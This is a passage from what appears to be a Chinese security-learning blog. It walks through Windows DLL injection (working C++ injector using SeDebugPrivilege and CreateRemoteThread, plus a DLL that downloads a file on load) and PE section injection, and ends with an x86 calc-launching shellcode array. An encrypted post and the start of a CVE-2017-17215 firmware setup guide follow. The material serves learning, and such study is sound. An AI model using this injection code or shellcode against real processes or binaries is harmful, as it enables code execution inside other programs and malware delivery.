class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,               &amp;hToken) )    &#123;        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup                               &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege    &#123;        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount &#x3D; 1;    tp.Privileges[0].Luid &#x3D; luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes &#x3D; 0;    &#x2F;&#x2F; Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )    &#123;        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;    HMODULE hMod &#x3D; NULL;    LPVOID pRemoteBuf &#x3D; NULL;    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    &#x2F;&#x2F; #1. dwPID notepad.exe    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());        return FALSE;    &#125;    &#x2F;&#x2F; #2.分配一块内存在目标进程中，用来存储dll的路径，设置权限为读写。    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    &#x2F;&#x2F; #3. 写入路径    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    &#x2F;&#x2F; #4. LoadLibraryA() API     hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);    &#x2F;&#x2F; #5. notepad.exe     hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;int _tmain(int argc, TCHAR *argv[])&#123;    if( argc !&#x3D; 3)    &#123;        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);        return 1;    &#125;    &#x2F;&#x2F; change privilege    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    &#x2F;&#x2F; inject dll    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>看main函数的usage就知道这是一个对指定pid注入指定dll的程序。</p><p>重点看到injectdll函数，<code>SetPrivilege</code>被用来设定权限。</p><p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>将要注入的dll路径写入目标进程内存。因为任何内存空间都无法写入，所以调用<code>VirtualAllocEx（）</code>在目标进程分配一块缓冲区，指定缓冲区大小为dll文件路径长度。同时设定权限为读写。</p><p>写入路径之后，调用了线程函数<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>创建远程线程，线程属于pProcess，还有一些参数，LoadLibraryW的地址和dll路径的地址。</p><p>看到dll代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;urlmon.lib&quot;)#define DEF_URL     (L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)#define DEF_FILE_NAME   (L&quot;index.html&quot;)HMODULE g_hMod &#x3D; NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )        return FALSE;    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );    if( !p )        return FALSE;    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    HANDLE hThread &#x3D; NULL;    g_hMod &#x3D; (HMODULE)hinstDLL;    switch( fdwReason )    &#123;    case DLL_PROCESS_ATTACH :         OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);        CloseHandle(hThread);        break;    &#125;    return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个就比较简单了，意思就是调用指定的API下载指定的文件到指定的地点。</p><p>综上：注入的main函数，创建一个新线程加载指定路径的dll，而该dll实现远程下载的功能。</p><p>这里利用了一个Windows os下的特性，由于要使得指定的线程加载，则需要知道目标线程的API函数地址，但是在Windows中，因为OS核心dll会被加载到自身固定的地址，dll注入利用的就是window OS的这一特性。所以，导入InjectDll.exe进程中的LoadLibraryW（）地址与导入notepad.exe进程中的LoadLibraryW（）地址是相同的。</p><h2 id="0x03-实践"><a class="header-anchor" href="#0x03-实践">¶</a>0x03 实践</h2><h3 id="hook实践"><a class="header-anchor" href="#hook实践">¶</a>hook实践</h3><p>这里看到响应函数，更改为如下:</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" alt=""></p><p>弹出计算器可能效果更加直观。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" alt=""></p><p>进程名字改为notepad++.exe，然后使用g++编译代码。</p><p><code> g++ --share ai.cpp -o ai.dll</code></p><p>编译完毕之后，把dll和exe放在一个目录下，然后运行exe</p><p><a href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" alt="jeNzFS.jpg"></a></p><p>hook成功</p><h3 id="dll实践"><a class="header-anchor" href="#dll实践">¶</a>dll实践</h3><p>同样的方式，编译代码，注意修改，使得可以弹出计算器。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" alt=""></p><p>但是这边编译代码的时候出了很多问题，于是把_tprintf全部替换成了printf，且所有字符串去掉了L前缀。</p><p>按道理来讲_tprintf不应该报错才对。</p><p>之后打开notepad 查看一下进程号。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" alt=""></p><p>运行册程序注入dll。改一下代码</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" alt=""></p><p>成功弹出计算器。</p><h2 id="0x04-dll注入实现提权"><a class="header-anchor" href="#0x04-dll注入实现提权">¶</a>0x04 dll注入实现提权</h2><p>前面看dll注入代码的时候，有一个提权函数。这里分析一下</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" alt=""></p><p>首先打开当前进程的令牌，存储在hToken中。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" alt=""></p><p>查看目标权限的上下文，存储到luid中。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" alt=""></p><p>用新建的tp对象替换原来的进程令牌实现权限的变化。</p><h2 id="0x05-PE注入"><a class="header-anchor" href="#0x05-PE注入">¶</a>0x05 PE注入</h2><p><a href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p><p>该文章对PE结构讲解十分详细。</p><p>PE（ Portable Execute）文件是Windows下可执行文件的总称，常见的有 <strong>DLL，EXE，OCX，SYS</strong> 等。它是微软在 UNIX 平台的 COFF（通用对象文件格式）基础上制作而成。<strong>最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下</strong>。<strong>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)</strong>。</p><p>PE文件的格式如下</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" alt=""></p><p>PE文件加载的过程如下：</p><ul><li>检查Dos header里面的PE header偏移，然后直接跳转到header</li><li>检查header是否合法，如果合法则跳转到header的尾部</li><li>header的尾部是节表，此时PE装载器会读取节表的信息，然后映射内存（虚存相关，操作系统讲过）</li><li>映射完毕之后，开始处理输入表的逻辑部分</li></ul><p>注意到文件中的节表和节</p><p><strong>节表</strong>：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</p><p><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个</p><p>**导出表 <strong>是 用来描述 模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress函数就能动态获取到函数的地址。</strong></p><p><strong>导入表</strong> 在 PE 文件加载时，会根据这个表里的内容加载依赖的 DLL ( 模块 )，并填充所需函数的地址。</p><h3 id="注入思路"><a class="header-anchor" href="#注入思路">¶</a>注入思路</h3><p>首先了解，PE文件中导入的dll信息以结构体的形式存储在IDT中。只要将dll添加到列表尾部就可以。<strong>IMAGE_OPPTIONAL_HEADER结构体中导入表RVA即是IDT的RVA。如果内存不够，就移动IDT。</strong></p><p><a href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDT结构解析</p><p>注入的手段一半有两种：</p><ul><li>寻找最大的代码空白，cave mine，将 shellcode 写入 cave 中。这种方式比较方便，缺点是只适合较小的  shellcode，windows 上的 shellcode 要比 linux 上的 shellcode 大许多，这种方式的泛用性不高。</li><li>新增 PE 节，这种方式修改 PE 文件的节头表和节，可以插入任意大小的 shellcode。</li></ul><p>PE 文件注入主要包括两个方面：</p><ul><li>编写 shellcode</li><li>注入 shellcode</li></ul><p>注入 shellcode 相对比较简单，下面介绍新增 PE 节实现 PE 注入的方法。</p><h3 id="注入实现"><a class="header-anchor" href="#注入实现">¶</a>注入实现</h3><p>思路大都是添加节之类的，这里自己没有实现，找了两个项目。</p><p><a href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> 这个是注入pe的项目</p><p><a href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> 这个很强，转化pe为shellcode</p><p><a href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> 这是pe_to_shellcode的解析</p><p>pe_to_shellcode这个东西得看代码才能懂。</p><p>演示一下第一个注入项目。</p><p>手动编译了一个32位的项目</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" alt=""></p><p>然后利用github项目中的exe，执行注入，注入的代码是弹出一个messagebox</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" alt=""></p><p>运行badpe</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" alt=""></p><p>点击确定之后会政策执行代码。弹计算器只需要把改代码替换为下面的shellcode即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span><span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span><span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span><span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span><span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span><span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span><span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span><span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span><span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span><span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span><span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span><span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span><span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span><span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span><span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span><span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span><span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span><span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span><span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span><span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span><span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span><span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span><span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span><span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span><span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>好怀百岁几回开</title>
    <link href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/"/>
    <url>/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="b0ec96c9e80e113f8a042cf4db3a4cfa5f83f218cde418c1898b44f037ef460c">cc0c0f8ba411acd26894e584ac9b5fda8b1dff880871afe6e43cf0d453c5369626edc82f20db218462ab795b986be0e1e3a75c8aa2169ad7d396023f00d3a0a41178c14531e052334812dce2b1ae5ae142ee68a6bfeb66bf51666b5a727caae0066d137e16b45fc41972d9bd15692c931827903324a77bbe57cea2ba9e154f0e60621540964ec127fd35853155d01d90b332874a0627e8baca858247ff16b47e0aa378a71f11ff40d35f2748d4c240e816e0ec814ecf809fb63203b607816c1c8b9f71bd111dee70c447e1cd19427baf57220568b5d6845756fc1733e2e0385bb15c42fc3d43f448d7af0241f248a1bc0982e56228f84a96ca5a0f695a1754fdf6a78fa70b27bbce0cafe8906c2ac80ce4e6f870a0c2b58c7f21d5e113713c0f8508501836184c7125282a8b3ca9d3288e8c18bbc433c491c88570c3056765a4c52f3637d36b94f522f4741d07598a12c6170e05b4df38438659705eccc049f1e9c17e34ec060bc6bdbbb6c8cc1b6e8b4e7aa0e267f3082753fd222f64615b3dd7e1b974d48780dfda239172fdcc06ac44366a413082e8ab9d5423fd32d86ff1835372e12c3e7459cf196a8001a8a32c331d04fc205eb59c01a108882cd18c82f29dfdd2ef9389e9cdd516820d2d70743d4efa8314fd7784d1c217fca1a02d89f158a16cc2a296c20bb585a3f06d4dc75558ff78aa9e15c3037f8eadf063c2f9fa72caf167ae5f3cc7c7b4bc1793552b46798b8b719c7cdd0923cd0e79292129eb99938a3844f5101c6319876ee93b842a21e7bc3ddcf48c7da3a57f467cac9a82575bfa475c1e90485aa4740270bc9c6cfd213eac8ea17b938f28e3b676c776011c96e0ea7bcd36cd4e80da275940aa745fcacfe69d79e7ffa73798abf20a88b3b00a2100ddf4bf813cbbb370a534c2ea397bc34ebef2059093065e4ce64aa0e6b4ef31eee1000933b3fbe8957f37ae70f8df58df1660dbe76dfd908e4d2f2bc276beb3b82c27a2ff12e9550cdc1e49e95df212fdcc26c7324b41385e75145544d585dd2a5d0ca3bf600432bdd47b9907822c642d8cf220602f6e1842fb4024f50aa80f7b01ff733f638b49bdef1f5159bc93827cba3967cacdc7d350a1f0b2f2aeeb76906b5e7ca59f6224bcc5c3b7f1850d0653685aef8c5957f3e81a5bc8be428fd2ac0dac69a7654c1e3bcc04eb8ddbea81f9343adae78d67e4f676d156396334da06abf31f7ccbd26e1a2bd23fa0422e14d4b85558bc046ce14a4ba950c3c617f00650995b0f5d38ac6c31b21d07e9011998a5f41c5e7854d0aafdd768ef0e04d9b9a4217828e386f1c9fd2080662ab654d4d2538964465a47da7b33ecd52a4b0230ad20235930d74aab1beb541cf98dad488d61c5e6745771538bcda9b389f2a4b062eda503a6c95d145f23bc4774110c600c030dbd837f447df8259eecbb6eb6fa597fe55be156ed963b4c5c3d649a018b138f2772906580959af5766ae47f0bb52864aa7a2baff48c642bb15dba639986e751dfa6c2e59fb773412ade44ac103f139301cd41049a2f853384498783d078fe01681f688d8db7fa9aef7173bbd3cd5fddad8f819ce766487fc7f7bc5e5ded8cbbe04c7056b63181ea2a4ac6a2f6c0070be5550b94af727212ed28ba71c3fe89c6ed48060b516d1d16330d60529421ee57e8c4b23f44e4098eb127008b457df179304612d702739054052c163f7f2908dd8147619ae75ad2a0cea057705497ad1bfa20aae2e94c610671f1acba51b7ec8f411423bb27d6b03a3c8bb8a9972ff3b92f14cad98cac3912293590a727e72722fdcd0819237a74d453d787ac9eb22a31d0266a1413c32c2ec981f5c7699db92d6f30383565088dadc58d179c74bcfaacf5da8649311adeaa1119bfcd00c09fa99b26089b0ac2b5ebe7ab2aed7183805d2d553a46e226db387d63ebe08e2dd04e6d2f7d3990b0fe31c147c214aba30cf13cbb6aafd49d90eba04c743204d248d3eb930043e62c9ed3ad9cfee41ba9da724e7f96b5ce97f6d0d2af21f87651897121f71f6e5819395b71dbfece4015610ce93be9e5c733d16ea128e8b86e8b703adc14c54e9a9bd508c4f7245bd90f344abc914e414677946383f36e0f7cba0214dc1906bfd97e09aa09fd8c9dd765eaf4d036a277587d6a83e77057913c47d519aa7a4e47b3ea7f3c964e868b0dd169311e76578aa7aba67e05fa3c506e404ce1f2f1b16f295dccaf9867250a48ef0ff02cb0c1d0a7686e6ef24a6984f4677cbca7ba29bdc3e929b0bc3576734b278b4fa8fd3380d5d099c03e07fba56f0a15794497a048d3210f862235d6e2f8a516123e751cc2a5d7f498b2d6903a1d523ea1e1414cda393536da2077e603431ef232a31e88f2e350811b97e7bf28da71a4cc42498a78bbcc0f808c30a1b5331d3196767f19e72a616ad4c5dede82ac78c7efbaeeafa2ef209d36810a293dac20496397dc01d56a4b10f14b9e7695b90bf316b350e744b492de9aafa70097a9075554ee0b2a5a8d06d64ea04222269b234c2d4c0d2b54a48659da221fcb6dd205b318eb1cc7ece13b88563b6f627129038d04ff6a6d8322733c83c9037a55f3c8de9a44ba08cbe665bc928e7b8114c593af7fe3c87fec5ce5da9b83786f5cc65972740fea9171a9ecbc02f273a377051589a5bdf60c76e9ba408a089db9bbe826c9ce6c63a65e690a3c2ebb938a9da165e50658dae09d67887df8df813da4107d2880b61c9ffc26a60c41ff4d6a93accb9f67fd469047a75cbba4acc10a49253ee391a967b5e61edd0e26094241146d4393f519908a7e0bee45eba0c352b0ebf35088f6a646f2bf45e4410e56b13398a0ec780b3758f55c7d65f71ea08e98b81a4104f901ed7827f85a0a79b5f946408953d894152df38830e11002532918b9e8d0c20b09530c8b1dd4af8f0d185b9e447ec4f22c48cd4bda5502e4f0a30b14fadf526214ed68bc46e20e0350422654b45c92eb6787b8f071ce87831ad4cf1a4865481f3bd3a213807184118eb14df3c712b88d5d70671bea06ff115373643ec6323f2ba82d21282fc01ec022de936d3caea2f73025e1939ab01b3b9da4f13ca87d78a125ae416ee0e56ed9c656e243719d4db18b95d4fb965f3399df320fcce15622beadde20767e50cbb36d94f926c3b8aaa47a787da6d6c226355a43fcb18d14e1847d740120f861be604382e8c703573404fc9f37c55c2b82bdbfec51edca8f2c83a03bb3680f51161e2cd931dbf2bc116e9fd8b1a3f09bacd5614cba987bb8936c638f7df629a41ab2cc4236cdd3fe5af14c9cdf6c63d14ed81bedb9b395fd923657edaed7bf1565137520586ca4b83378b08827a0807eb377dc42cfaa38ab10768071fc8146ad1d9df149554dc20d5aeff18ca051064d742e9ecc69d53094be759b4c5ecd951c3ccf344449a9e94c6afac622bf13c93f9573aa0debdd5aaa28074eaf5881d181cfc5710835a52fbc40b8d81f2bf880ce4c942a5b483057528bd82d07da86cd2024c6e8cd40af35571faf9336d9474af2c36f98c2e2606235f0bdad9fa6be09342feb759d024ff8409fdcf81a304408a8d67b6790e320b8cae0c528ce94963c1f6921d3049acb7c5fd1231b8bf08d5feac3ef09ee2f9df066d2075d28f17e2febca6878ca5cd8d96268b4f77fbdab02d0981951523e9c76c7e7da51a5a2f4b05af48832c7e0e68d838592906c1e4ce43450fc82e4da4be36282defd01265dda6316bb211e12ec1077d0ae2d78ebc273f93136b81a33db4d454947ed017767705510c8e3d6ad4e6db09900d914511549892365fc4d5b5250cb1392e62adfe84c4537278e62cf9a089371df054c1a9a176be20be83d19a45ee9355d8f6a9624e5db5a3104a648b7603763506f62caf20fcc6739341ae430cb25fa9f84e1a6ac9df9dfac2e0ea743b054463350f6e8ce1805bb02928d9096cac369864f7924ffc57b7b81508f94da63dade05d420acd29c97d27f92af237442f581e1b9a2a96411c351213a32c0ad633a52eaa8d0cac9ef8ff26e9bc8015043c3106ef06d6a1e95a0bc3a3b1d7754fb40bc0c2c4ea4b554709d7db4ff40def2d6552f5aa0715a57880c74d8cbe84d0742ebb2e29b1dc9e00fb2d70e6946eabcde357ec30cb72098f9fa36b96af64ce99a43efceb2708a0ad21a34f9d6e500da54d6b6c6c4e5fb970b42ef6f8e04bc75fe0581bd5bb2cb5018506cac5be19e1cbf6056969a0b069668d38b4e281fec92b45b2086ff74a5aea0828877627071efac78dc10a6d7c3666afa4af742a217475c6f6c3e92c447ad734956b2c96a515243cb82f03cc3a40f668cd3aa651c956b5a83fef491a49a396156782122f8031bc4c6fbb628871c357edaf58e64d902f429d0cbee1756b0b4010e40e3e0cfa1d40e1d5c6e1a27f39544946c73976fed2054aa4be0b9cd24a56e356f53f287c17500c5321b0b2e6260d41b2a4503dd88d1189de3ab34a5efbfcc4f1183be262de5adc7b526dda1af343cc1606b09ef2227cb1d38586aef4ffc9451f0c6d80243fa956b02a0238f3bb3d092fdc2242c1f834f64810a142ec3d5133045686976036a25166124315fb0598394c28ed792eae98ce5206b7186d9041edddb4051c323a2f311dbebd1ea9f6559472ebba42d02780f2cbdd83bf1d4eb743576177b3f797a343ad44d2128b94d33a6f1a9fe0f59d761f75ac7ac7d041ea89aa8ee3b2a07c61acddfa00b0a95caa73300ac9268503f3f5a2a0fc7f44c96b1d04cac3e8220d913357281dc3562c09ddb5de59f9690b16fb9fed0cc20eb2be8b367748a7d26ebef78a2ff5d966aed212b1c5dc794e4b15871c5c7b5ca8ea8ff465c0477a021ab66c9c58e82ca6529c39581b053c8347e2e1c74cca1b7552f3e0d55786e0f111827a2f3b11b6be60b512e304967775ad9aa69e57e43b327a925416c2f74971c3247fa95465ba60ae8397ac0ff5c2cf4ecf5e678b30b4218db4df805afc57df270e7af42cd623fd50e2b302b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215复现</title>
    <link href="/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于合天网安实验室，链接时间太久忘了。</p></blockquote><p>😈远古时期学习路由器固件分析，并尝试复现了一个简单的CVE。中间遇到了很多的坑点，虽然把漏洞复现了，但是过程可谓曲折。</p><p>ps：该文章以复现CVE-2017-17215为基础，提供一个详细的固件分析入门手册。</p><h2 id="0x01-环境准备"><a class="header-anchor" href="#0x01-环境准备">¶</a>0x01 环境准备</h2><p>环境准备是分析固件的基础。手里的环境是ubuntu20，中间也尝试过过kali2020。<strong>期间尝试过自动化工具Firmadyne，以及其plus版本</strong>，但是都失败了，这里一些师傅那里得到建议，Firmadyne工具的镜像和内核太老了，建议手动换新的，此外该自动化分析工具其实也有较大的局限性，所以我建议<strong>手动配置一个固件模拟环境十分有必要</strong></p><p>下面是环境的配置过程。</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ubuntu20 python2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Binwalk安装"><a class="header-anchor" href="#Binwalk安装">¶</a>Binwalk安装</h3><p>Binwalk是一款优秀的固件提取工具，我们拿到手的，需要分析的固件大都是bin文件，这时候BInwalk工具就起到了从中分析出文件系统的作用。</p><p><strong>apt下载的和kali自带的Binwalk</strong>缺少部分重要的分析插件，建议手动编译安装，避免固件分析失败。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove binwalk  //如果有的话，先删除旧版的Binwalk<span class="token function">git</span> clone https://github.com/devttys0/binwalk //从git上获取binwalk<span class="token builtin class-name">cd</span> binwalk<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span> //Binwalk使用python3编译安装//如果是python2环境，就需要先安装以下依赖<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果git出现问题可以尝试把<code>https://</code>改成<code>git://</code>，等待编译完毕即可完成Binwalk的安装。</p><p>然后安装一些其他的依赖。<br>Binwalk uses the pycrypto library to decrypt some known encrypted firmware images:<br>Binwalk提供分析一些加密固件的插件，但是用到了pycrypto库，所以我们还要再安装一下该库。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-crypto<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-crypto<span aria-hidden="true" 